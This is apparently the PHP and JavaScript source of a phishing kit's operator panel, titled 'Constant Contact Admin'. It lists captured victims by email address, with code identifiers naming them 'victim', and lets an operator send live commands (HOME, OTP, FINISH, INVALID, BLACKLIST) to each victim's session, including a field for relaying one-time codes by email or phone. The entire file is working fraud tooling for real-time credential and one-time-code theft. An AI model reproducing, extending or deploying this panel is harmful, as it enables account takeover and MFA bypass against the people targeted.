<?php 
@session_start();
if(!isset($_SESSION['user'])) {
	header('Location: ./login');
    exit();
}





?>
<!DOCTYPE html>
<!-- saved from url=(0023)https://eye.ourqbo.com/ -->
<html lang="en" class="fontawesome-i2svg-active fontawesome-i2svg-complete">

<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">

    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta name="description" content="">
    <meta name="author" content="">
    <title>Constant Contact Admin</title>
    <link href="./css/data-table-style.css" rel="stylesheet">
    <link href="./css/styles.css" rel="stylesheet">
    <link href="./css/datatables.css" rel="stylesheet">
    <link href="css/jquery.ambiance.css" rel="stylesheet" />
    <link rel="stylesheet" href="./css/font-awesome.min.css">

    <link href="./css/fontawesome.css" rel="stylesheet">
    <link href="./css/brands.css" rel="stylesheet">
    <link href="./css/solid.css" rel="stylesheet">
    <link href="./css/base.css" rel="stylesheet">

<style>
::-webkit-scrollbar {
width: 10px;
}

/* Track */
::-webkit-scrollbar-track {
background: #212529;
}

/* Handle */
::-webkit-scrollbar-thumb {
background: #4d5257;
}

/* Handle on hover */
::-webkit-scrollbar-thumb:hover {
background-image: linear-gradient(to right, #191c24, #ff0000);
}
</style>
    <!-- <script src="./QBooks Admin_files/all.min.js.download" crossorigin="anonymous"></script> -->
</head>

<?php include 'header.php'; ?>


<body class="sb-nav-fixed">

    <!-- Modal -->
<div class="modal fade" id="themeModal" role="dialog">
  <div class="modal-dialog">
  
    <!-- Modal content-->
    <div style="background-image: var(--GlobalBG);border-radius: 16px;box-shadow: 0 4px 30px rgba(0, 0, 0, 0.1);backdrop-filter: blur(5px);-webkit-backdrop-filter: blur(5px);border: 1px solid rgba(255, 255, 255, 0.3);" class="modal-content">
      <div class="modal-header">
        <!-- <i style="color:red;cursor:pointer;font-size: 24px;" onclick="toggelVictim()" data-dismiss="modal" class="mdi mdi-close-box-outline"></i> -->
        <h4 style="color: var(--textColor);" class="modal-title">Loading...</h4>
      </div>
      <div class="modal-body">

        <div id="VictabLE"  class="table-responsive" style="height:300px;">
            <center>
            <div class="spinner-border" style="width: 3rem; height: 3rem;" role="status">
            <span class="sr-only">Loading...</span>
            </div>
            </center>
        </table>
        </div>

      </div>
      <div class="modal-footer">
        <button onclick="toggelVictim()" type="button" class="btn btn-default" data-dismiss="modal" style="color: var(--textColor);">Close</button>
      </div>
    </div>
    
  </div>
</div>


    <div id="layoutSidenav_content">
            <main>
                <div class="container-fluid px-4">
                    <h1 class="mt-4"><svg class="svg-inline--fa fa-tachometer-alt fa-w-18" aria-hidden="true"
                            focusable="false" data-prefix="fas" data-icon="tachometer-alt" role="img"
                            xmlns="http://www.w3.org/2000/svg" viewBox="0 0 576 512" data-fa-i2svg="">
                            <path fill="currentColor"
                                d="M288 32C128.94 32 0 160.94 0 320c0 52.8 14.25 102.26 39.06 144.8 5.61 9.62 16.3 15.2 27.44 15.2h443c11.14 0 21.83-5.58 27.44-15.2C561.75 422.26 576 372.8 576 320c0-159.06-128.94-288-288-288zm0 64c14.71 0 26.58 10.13 30.32 23.65-1.11 2.26-2.64 4.23-3.45 6.67l-9.22 27.67c-5.13 3.49-10.97 6.01-17.64 6.01-17.67 0-32-14.33-32-32S270.33 96 288 96zM96 384c-17.67 0-32-14.33-32-32s14.33-32 32-32 32 14.33 32 32-14.33 32-32 32zm48-160c-17.67 0-32-14.33-32-32s14.33-32 32-32 32 14.33 32 32-14.33 32-32 32zm246.77-72.41l-61.33 184C343.13 347.33 352 364.54 352 384c0 11.72-3.38 22.55-8.88 32H232.88c-5.5-9.45-8.88-20.28-8.88-32 0-33.94 26.5-61.43 59.9-63.59l61.34-184.01c4.17-12.56 17.73-19.45 30.36-15.17 12.57 4.19 19.35 17.79 15.17 30.36zm14.66 57.2l15.52-46.55c3.47-1.29 7.13-2.23 11.05-2.23 17.67 0 32 14.33 32 32s-14.33 32-32 32c-11.38-.01-20.89-6.28-26.57-15.22zM480 384c-17.67 0-32-14.33-32-32s14.33-32 32-32 32 14.33 32 32-14.33 32-32 32z">
                            </path>
                        </svg><!-- <i class="fas fa-tachometer-alt"></i> Font Awesome fontawesome.com --> Dashboard</h1>
                    <ol class="breadcrumb mb-4">
                        <li class="breadcrumb-item active">Welcome</li>
                    </ol>
                    <div class="row">
                        <div class="col-xl-6 col-md-6 col-12">
                            <div class="card bg-dark text-white mb-4">
                                <div class="card-body">
                                    <div class="d-flex align-items-center justify-content-between">
                                        <h2><span class="small text-white stretched-link" id="TotalActive">Total Logs <br><?php include 'count.php'; ?></span><br></h2>
                                        <div class="text-white"><svg class="svg-inline--fa fa-user fa-w-14 fa-3x"
                                                aria-hidden="true" focusable="false" data-prefix="fas" data-icon="user"
                                                role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"
                                                data-fa-i2svg="">
                                                <path fill="currentColor"
                                                    d="M224 256c70.7 0 128-57.3 128-128S294.7 0 224 0 96 57.3 96 128s57.3 128 128 128zm89.6 32h-16.7c-22.2 10.2-46.9 16-72.9 16s-50.6-5.8-72.9-16h-16.7C60.2 288 0 348.2 0 422.4V464c0 26.5 21.5 48 48 48h352c26.5 0 48-21.5 48-48v-41.6c0-74.2-60.2-134.4-134.4-134.4z">
                                                </path>
                                            </svg><!-- <i class="fas fa-user fa-3x"></i> Font Awesome fontawesome.com -->
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                        <div class="col-xl-6 col-md-6 col-12">
                            <div class="card bg-dark text-white mb-4">
                                <div class="card-body">
                                    <div class="d-flex align-items-center justify-content-between">
                                        <h2><span class="small text-white stretched-link">Refreshing in </span><br><span
                                                id="timer">1:25</span></h2>
                                        <div class="text-white"><svg class="svg-inline--fa fa-clock fa-w-16 fa-3x"
                                                aria-hidden="true" focusable="false" data-prefix="fas" data-icon="clock"
                                                role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"
                                                data-fa-i2svg="">
                                                <path fill="currentColor"
                                                    d="M256,8C119,8,8,119,8,256S119,504,256,504,504,393,504,256,393,8,256,8Zm92.49,313h0l-20,25a16,16,0,0,1-22.49,2.5h0l-67-49.72a40,40,0,0,1-15-31.23V112a16,16,0,0,1,16-16h32a16,16,0,0,1,16,16V256l58,42.5A16,16,0,0,1,348.49,321Z">
                                                </path>
                                            </svg><!-- <i class="fas fa-clock fa-3x"></i> Font Awesome fontawesome.com -->
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>

                    <div class="card mb-4">
                        <div class="card-header">
                            <div class="d-flex align-items-center justify-content-between mb-0">
                                <div><strong><svg class="svg-inline--fa fa-user fa-w-14 me-1" aria-hidden="true"
                                            focusable="false" data-prefix="fas" data-icon="user" role="img"
                                            xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512" data-fa-i2svg="">
                                            <path fill="currentColor"
                                                d="M224 256c70.7 0 128-57.3 128-128S294.7 0 224 0 96 57.3 96 128s57.3 128 128 128zm89.6 32h-16.7c-22.2 10.2-46.9 16-72.9 16s-50.6-5.8-72.9-16h-16.7C60.2 288 0 348.2 0 422.4V464c0 26.5 21.5 48 48 48h352c26.5 0 48-21.5 48-48v-41.6c0-74.2-60.2-134.4-134.4-134.4z">
                                            </path>
                                        </svg><!-- <i class="fas fa-user me-1"></i> Font Awesome fontawesome.com -->Administrator</strong>
                                </div>
                                <div><strong><svg class="svg-inline--fa fa-table fa-w-16 me-1" aria-hidden="true"
                                            focusable="false" data-prefix="fas" data-icon="table" role="img"
                                            xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" data-fa-i2svg="">
                                            <path fill="currentColor"
                                                d="M464 32H48C21.49 32 0 53.49 0 80v352c0 26.51 21.49 48 48 48h416c26.51 0 48-21.49 48-48V80c0-26.51-21.49-48-48-48zM224 416H64v-96h160v96zm0-160H64v-96h160v96zm224 160H288v-96h160v96zm0-160H288v-96h160v96z">
                                            </path>
                                        </svg><!-- <i class="fas fa-table me-1"></i> Font Awesome fontawesome.com -->All
                                        Logs</strong></div>
                            </div>
                        </div>
                        <div class="card-body">
                            <div
                                class="datatable-wrapper datatable-loading no-footer sortable searchable fixed-columns">
                                <div class="datatable-top">
                           
                                </div>
                                <div class="datatable-container">

                                    
                                    <table id="myTable" class="display">
                                        <thead>
                                            <tr>
                                                <th>Email</th>
                                                <th>Mode</th>
                                                <th>Task</th>
                                            </tr>
                                        </thead>
                                        <tbody id="CountTable">

<?php
$directory = '../tracker'; // Replace with the actual directory path
$jsonFiles = glob($directory . '/*.json');

$fileTimes = array(); // Array to store file timestamps

foreach ($jsonFiles as $file) {
    $fileTimes[$file] = filemtime($file); // Get file modification time
}

arsort($fileTimes); // Sort the file times in descending order

foreach ($fileTimes as $file => $fileTime) {
    $fileName = basename($file, '.json');
    $vid = rand();

    echo ' <tr id="row' . $vid . '" data-index="0">
<td class="align-middle">' . $fileName . '<i onclick="toggelVictim(\'' . $fileName . '\')" class="fa-solid fa-circle-info"></i></td>
<td style="display : flex;flex-direction: column-reverse;" class="align-middle form-inline">
<select class="xselect" id="SELECT' . $vid . '">
    <option selected="" disabled="" value="null">Select</option>
    <option value="EMAIL">Email</option>
    <option value="PHONE">Phone</option>
</select>
<input placeholder="value..." id="CODE' . $vid . '" type="text">
</td>
    <td max-width="100px" class="align-middle form-inline">
        <button onclick="submitCommand(\'HOME\', \'' . $vid . '\', \'' . $fileName . '\')" id="HOME' . $vid . '" data-id="' . $fileName . '" task="HOME" data-loading-text="<i class=\'fa fa-spinner fa-spin \'></i>" class="perform btn btn-primary btn-sm btn-lg">HOME</button>
        <button onclick="submitCommand(\'OTP\', \'' . $vid . '\', \'' . $fileName . '\')" id="OTP' . $vid . '" data-id="' . $fileName . '" task="OTP" data-loading-text="<i class=\'fa fa-spinner fa-spin \'></i>" class="perform btn btn-primary btn-sm btn-lg">OTP</button>
        <button onclick="submitCommand(\'FINISH\', \'' . $vid . '\', \'' . $fileName . '\')" id="FINISH' . $vid . '" data-id="' . $fileName . '" data-loading-text="<i class=\'fa fa-spinner fa-spin \'></i>"data-loading-text="<i class=\'fa fa-spinner fa-spin \'></i>" task="FINISH" class="perform btn btn-primary btn-sm btn-lg">Finish</button>
        <button onclick="submitCommand(\'INVALID\', \'' . $vid . '\', \'' . $fileName . '\')" id="INVALID' . $vid . '" data-id="' . $fileName . '" data-loading-text="<i class=\'fa fa-spinner fa-spin \'></i>" task="INVALID" class="perform btn btn-warning btn-sm btn-lg">Invalid</button>
        <button onclick="submitCommand(\'BLACKLIST\', \'' . $vid . '\', \'' . $fileName . '\')" id="BLACKLIST' . $vid . '" data-id="' . $fileName . '" data-loading-text="<i class=\'fa fa-spinner fa-spin \'></i>" task="BLACKLIST" class="perform btn btn-dark btn-sm btn-lg">Blacklist</button>
        <button onclick="submitCommand(\'Del\', \'' . $vid . '\', \'' . $fileName . '\')" id="Del' . $vid . '" data-id="' . $fileName . '" data-loading-text="<i class=\'fa fa-spinner fa-spin \'></i>" class="delete btn btn-danger btn-sm btn-lg">Delete</button>
    </td>
</tr>';
}
?>



<script>
function submitCommand(cmd, vid, fileName) {
    var $this_btn = $('#'+cmd+vid);
    $this_btn.html('<span class="spinner-border spinner-border-sm" role="status" aria-hidden="true"></span><span class="sr-only">Loading...</span>');
    $this_btn.attr('disabled', true);

    bootbox.confirm({
        title: 'are you sure?',
        message: 'Do you want to set this command? This cannot be undone.',
        buttons: {
        cancel: {
        label: '<i class="fa fa-times"></i> Cancel'
        },
        confirm: {
        label: '<i class="fa fa-check"></i> Confirm'
        }
        },
        callback: function (result) {
        console.log('This was logged in the callback: ' + result);
        if(result == true) {
            setCommand(cmd, vid, fileName)
        } else {
            console.log('Cancel')
            $this_btn.html(cmd);
            $this_btn.attr('disabled', false);
        }
        }
    });


    

}
</script>
                                           
                                        </tbody>
                                    </table>

                                </div>
                                <!-- <div class="datatable-bottom">
                                    <div class="datatable-info">Showing 1 to 9 of 9 entries</div>
                                    <nav class="datatable-pagination">
                                        <ul class="datatable-pagination-list"></ul>
                                    </nav>
                                </div> -->
                            </div>
                        </div>
                    </div>
                </div>
            </main>

    


<script src="./js/jquery.js"></script>
<script src="./js/popper.min.js"></script>
<script src="./js/bootstrap.bundle.min.js"></script>
<script src="./js/scripts.js"></script>
<script src="./js/datatables.js"></script>
<script type='text/javascript' src='js/jquery.ambiance.js'></script>
<script type='text/javascript' src='js/bootbox.js'></script>
<script>
    function Clean() {
        $.ajax({
        method: "POST",
        cache: false,
        url: './api.php',
        data: {
          Clean: 'yes',
        },
        success: function (res) {
            $.ambiance({message: "",title: "Clean success✅" ,type: "success"});
            reloadx();
        }
    });
    }
function reloadx() {
    document.getElementById('timer').innerHTML = '0:20';
    $('#CountTable').load('./api.php?GetControl&timestamp=' + new Date().getTime());
    $('#TotalActive').load('./api.php?count&timestamp=' + new Date().getTime());
    $.ambiance({message: "",title: "refresh success✅" ,type: "success"});

    autopilot();
}

function toggelVictim(vict3m) {
    $("#themeModal").modal("toggle");
    var x = Math.random();
    //   $('#VictabLE').load('./api.php?getClientData&x='+x);

    $.ajax({
          type: "GET",
          url: './api.php?getClientData='+vict3m+'&x='+x,
          cache: false,
          success: function(resp){  
            $('#VictabLE').html(resp.vicdata);
            $('.modal-title').text(resp.vicid);
        }
      });

}
function setCommand(command, vid, fileName) {
    
    if(command == "OTP") {
        var usrcode = $("#"+"CODE"+vid).val();
        var codetype = $("#"+`SELECT${vid}`).val();


        var data = {
            'command': command,
            'fileName': fileName,
            'code': usrcode,
            'type': codetype,
        };

    } else {
        var data = {
            'command': command,
            'fileName': fileName,
            // 'code': usrcode,
        };
    }

    // Make an AJAX request to update the JSON file on the visitors page
    var xhr = new XMLHttpRequest();
    xhr.onreadystatechange = function() {
        if (xhr.readyState === XMLHttpRequest.DONE) {
            if (xhr.status === 200) {
                console.log('Command set successfully');
                console.log('Response from command:', xhr.responseText);
                $.ambiance({message: "",title: "Command set successfully✅" ,type: "success"});
                document.getElementById('timer').innerHTML = "0:20";
                reloadx();
                $('#'+command+vid).html(command);
                $('#'+command+vid).attr('disabled', false);

            } else {
                console.error('Error setting command');
                $.ambiance({message: "",title: "Error setting command📛" ,type: "error"});
                $('#'+command+vid).html(command);
                $('#'+command+vid).attr('disabled', false);
            }
        }
    };
    xhr.open('POST', 'update-command.php', true);
    xhr.setRequestHeader('Content-Type', 'application/json');
    xhr.send(JSON.stringify(data));
}

    document.getElementById('timer').innerHTML = "0:20";

    startTimer();

    function startTimer() {
        if ($('#mustPause').val() == "YES") {
            document.getElementById('timer').innerHTML = "0:20";
        }
        var presentTime = document.getElementById('timer').innerHTML;
        var timeArray = presentTime.split(/[:]+/);
        var m = timeArray[0];
        var s = checkSecond((timeArray[1] - 1));
        if (s == 59) { m = m - 1 }
        if (m < 0) {
            reloadx();
            startTimer();
            return
        }

        document.getElementById('timer').innerHTML = m + ":" + s;
        setTimeout(startTimer, 1000);
    }

    function checkSecond(sec) {
        if (sec < 10 && sec >= 0) { sec = "0" + sec }; // add zero in front of numbers < 10
        if (sec < 0) { sec = "59" };
        return sec;
    }

    function autopilot(){
        var vall = $('#apilot_val').val();
        // alert(vall);

        // if(vall != "YES"){
        //     return
        // } else if(vall != "NO"){
        //     return
        // }

        $.ajax({
            method: "POST",
            cache: false,
            url: './api.php',
            data: {
                autopilot: vall,
            },
            success: function (res) {
                if(res){
                    $.ambiance({message: "",title: "Autopilot ==> "+ vall,type: "success"});
                  
                }
                
            }
        });

        

    }

    // setTimeout(function () {
    //     location.reload();
    // }, 120000);
</script>
<footer class="py-4 bg-light mt-auto">
    <div class="container-fluid px-4">
        <div class="d-flex align-items-center justify-content-between small">
            <div class="text-muted">Copyright © Goal 2023</div>
        </div>
    </div>
</footer>
</div>
    
    <script>
        let table = new DataTable('#myTable', {
            responsive: true
        });

        $('#sidebarToggle').click(function() {
            $('#layoutSidenav_nav').toggle(1000);
            // var check = $('#layoutSidenav_nav').css('transform');
            // alert('check: '+check);
            // if(check == "translateX(0)") {
            //     // $('#layoutSidenav_nav').css('transform', 'translateX(1)');
            //     $('#layoutSidenav_nav').hide(1000);
            // } else {
            //     // $('#layoutSidenav_nav').css('transform', 'translateX(0)');
            //     $('#layoutSidenav_nav').show(1000);
            // }

            // $('#layoutSidenav_nav').toggle();
            // $('#layoutSidenav_content').css('padding-left', '0px');
 

        });

    </script>

</body>

</html>